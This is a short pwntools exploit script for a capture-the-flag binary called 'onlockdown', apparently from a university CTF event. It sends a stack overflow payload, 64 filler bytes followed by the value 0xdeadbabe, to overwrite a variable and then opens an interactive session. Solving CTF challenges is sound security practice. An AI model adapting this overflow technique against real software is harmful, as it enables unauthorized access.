#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF('./onlockdown')

host = args.HOST or 'ctf.umbccd.io'
port = int(args.PORT or 4500)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil("Can you convince him to give it to you?\n")
payload = (
    b"A" * 64 +
    p32(0xdeadbabe)
)
io.sendline(payload)

io.interactive()
